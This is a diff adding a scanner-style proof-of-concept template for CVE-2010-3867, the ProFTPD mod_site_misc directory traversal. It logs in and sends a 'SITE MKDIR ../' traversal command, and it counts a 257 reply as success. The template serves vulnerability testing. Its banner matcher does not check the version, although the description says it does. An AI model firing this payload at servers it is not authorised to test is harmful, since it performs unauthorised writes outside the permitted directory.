@@ -1,0 +1,66 @@
+[info]
+author = "ave"
+description = "ProFTPD 1.3.3c 之前版本的 mod_site_misc 模块存在目录遍历漏洞（CVE-2010-3867）。本 PoC 首先通过 FTP 服务横幅被动检测目标运行的 ProFTPD 版本是否低于 1.3.3c（官方 nuclei 模板验证方式）；随后以认证用户身份发送带有 ../ 遍历序列的 SITE MKDIR 命令，若服务器返回目录创建成功响应则证明遍历生效。攻击需有效 FTP 账号及 SITE 命令权限。"
+id = "POC-AVE-2010-0105"
+name = "ProFTPD mod_site_misc 目录遍历 PoC"
+severity = "high"
+tags = ["ave-2010-0105"]
+vuln_id = [
+    "CVE-2010-3867",
+    "AVE-2010-0105",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+path = "{{Hostname}}:21"
+protocol = "tcp"
+
+[[poc.requests.raws]]
+type = "receive"
+read_size = 1024
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["ProFTPD"]
+expect = true
+
+[[poc.requests]]
+path = "{{Hostname}}:21"
+protocol = "tcp"
+
+[[poc.requests.raws]]
+type = "receive"
+read_size = 1024
+
+[[poc.requests.raws]]
+type = "send"
+content = "USER {{username}}\r\n"
+
+[[poc.requests.raws]]
+type = "receive"
+read_size = 1024
+
+[[poc.requests.raws]]
+type = "send"
+content = "PASS {{password}}\r\n"
+
+[[poc.requests.raws]]
+type = "receive"
+read_size = 1024
+
+[[poc.requests.raws]]
+type = "send"
+content = "SITE MKDIR ../ave_poc_test_dir\r\n"
+
+[[poc.requests.raws]]
+type = "receive"
+read_size = 1024
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["257"]
+expect = true
